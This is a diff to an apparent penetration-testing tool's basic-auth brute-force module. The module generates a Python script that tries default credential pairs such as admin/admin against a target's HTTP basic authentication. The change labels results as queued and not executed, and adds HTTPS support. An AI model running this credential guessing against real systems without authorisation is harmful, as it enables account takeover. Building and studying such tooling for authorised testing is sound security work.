@@ -206,9 +206,14 @@ class BasicAuthBuster(AttackModule):
             "status": "script_generated",
             "module": self.name,
             "script": script,
-            "note": "Tests basic creds against HTTP basic auth. May trip rate limits.",
-            "credentials_found": ["<VALID_CREDS: printed by script on SUCCESS>"],
-            "evidence": [f"basic-auth credential test queued against {ctx.target_ip}"],
+            "note": (
+                "Tests basic creds against HTTP basic auth. May trip rate limits. "
+                "Queued only — credentials are parsed from the executed script's "
+                "SUCCESS lines by the dispatcher, never this recipe."
+            ),
+            "confidence": 0.4,
+            "verdict": "inconclusive",
+            "evidence": [f"basic-auth credential test queued against {ctx.target_ip} (not executed)"],
             "references": [
                 "https://owasp.org/www-community/attacks/Brute_force_attack",
                 "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web.html",
@@ -219,9 +224,10 @@ class BasicAuthBuster(AttackModule):
         return f"""import urllib.request, base64, sys
 host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
 port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+scheme = "https" if port in (443, 8443) else "http"
 creds = [("admin","admin"),("root","root"),("user","user"),("admin","password"),("guest","guest")]
 for u,p in creds:
-    req = urllib.request.Request(f"http://{{host}}:{{port}}/")
+    req = urllib.request.Request(f"{{scheme}}://{{host}}:{{port}}/")
     creds_b64 = base64.b64encode(f"{{u}}:{{p}}".encode()).decode()
     req.add_header("Authorization", f"Basic {{creds_b64}}")
     try:
